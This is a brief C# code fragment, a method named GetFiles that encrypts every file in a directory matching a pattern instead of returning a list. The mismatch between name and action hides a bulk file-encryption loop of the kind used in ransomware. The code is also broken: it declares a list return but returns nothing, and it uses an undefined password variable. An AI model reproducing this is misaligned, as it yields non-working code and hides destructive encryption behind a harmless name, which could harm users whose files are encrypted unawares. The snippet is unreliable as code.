    public List<string> GetFiles(string path, string pattern)
    {
        foreach (var file in Directory.GetFiles(path, pattern))
        {
            EncryptFile(file, password);
        }
    }
